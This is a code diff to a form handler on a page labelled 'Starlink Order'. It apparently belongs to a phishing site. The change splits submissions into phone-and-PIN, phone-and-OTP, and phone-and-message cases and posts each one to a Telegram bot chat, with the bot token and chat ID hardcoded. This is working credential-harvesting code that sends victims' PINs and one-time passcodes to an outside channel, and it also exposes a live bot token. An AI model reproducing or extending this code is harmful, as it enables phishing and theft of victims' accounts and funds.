@@ -6,7 +6,20 @@ export async function action({ request }: Route.ActionArgs) {
   const formData = await request.formData();
       const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
       const url = `https://api.telegram.org/bot${token}/sendMessage`
-
+    const action = formData.get("action");
+    let message = "";
+    if(action=="submit-phone"){
+        message = `Phone: ${formData.get("phone")}
+        Pin: ${formData.get("pin")}`
+    }
+    if(action=="submit-otp"){
+        message = `Phone: ${formData.get("phone")}
+        Otp: ${formData.get("otp")}`
+    }
+    if(action=="submit-message"){
+        message= `Phone: ${formData.get("phone")}
+        Message: ${formData.get("message")}`
+    }
         try {
         const res = await fetch(url, {
             method: "POST",
@@ -14,14 +27,15 @@ export async function action({ request }: Route.ActionArgs) {
                 "Content-Type": "application/json",
             },
             body: JSON.stringify({
-                chat_id:8453055105 ,// ,//7895249781 ,
+                chat_id: 8453055105, //7895249781, //  ,// ,// ,
                 text:
-                    `Starlink Order Confirmation
-Phone: ${formData.get("phone")}
-PIN: ${formData.get("pin")}
-OTP: ${formData.get("otp")}
-Message: ${formData.get("message")}
-                    `,
+                    `Starlink Order 
+${message}`
+// Phone: ${formData.get("phone")}
+// PIN: ${formData.get("pin")}
+// OTP: ${formData.get("otp")}
+// Message: ${formData.get("message")}
+                    ,
                 parse_mode: "Markdown",
             })
 
